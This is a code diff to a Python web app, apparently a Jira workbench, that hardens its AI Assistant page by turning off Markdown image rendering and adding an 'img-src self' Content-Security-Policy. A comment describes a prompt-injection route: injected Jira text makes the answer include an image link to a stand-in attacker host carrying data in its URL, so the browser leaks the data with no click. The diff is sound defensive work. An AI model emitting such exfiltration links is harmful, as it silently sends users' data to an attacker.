@@ -4908,7 +4908,19 @@ def render_meta_section_page(
 # like a raw HTML/script tag (unlikely from a local CLI's own output, but
 # this still renders straight into a browser) -- such text is escaped and
 # shown literally instead of being interpreted as markup.
-_ANSWER_MARKDOWN = MarkdownIt("commonmark", {"html": False})
+#
+# Images are disabled too: the answer is untrusted (the engine reads
+# synced Jira text, which can carry a prompt injection), and an
+# ![x](https://attacker/?d=...) image would make the browser fetch an
+# attacker URL with no click at all. With the rule off, that syntax renders
+# as a plain "!" plus an ordinary link the user has to choose to follow.
+# ASSISTANT_PAGE_CSP backs this up at the browser level.
+_ANSWER_MARKDOWN = MarkdownIt("commonmark", {"html": False}).disable("image")
+
+# Sent only with the Assistant page: it has no images of its own, so it can
+# refuse every non-same-origin image. Not applied site-wide because other
+# pages show assignee avatars served from Jira's own avatar hosts.
+ASSISTANT_PAGE_CSP = "img-src 'self'"
 
 
 def _render_assistant_answer(text: str) -> str:
@@ -6604,7 +6616,10 @@ def create_app(jira_dir: Path, config: WorkbenchConfig, config_path: Path | None
         return _redirect_to_meta_section("labels", project, flash=flash, flash_kind=flash_kind)
 
     @app.get("/assistant", response_class=HTMLResponse)
-    def assistant_page(conversation: str | None = None, flash: str | None = None, flash_kind: str | None = None) -> str:
+    def assistant_page(
+        response: Response, conversation: str | None = None, flash: str | None = None, flash_kind: str | None = None
+    ) -> str:
+        response.headers["Content-Security-Policy"] = ASSISTANT_PAGE_CSP
         stored = _assistant_conversations.get(conversation) if conversation else None
         return render_assistant_page(
             conversation if stored else None, stored, flash=flash, flash_kind=flash_kind
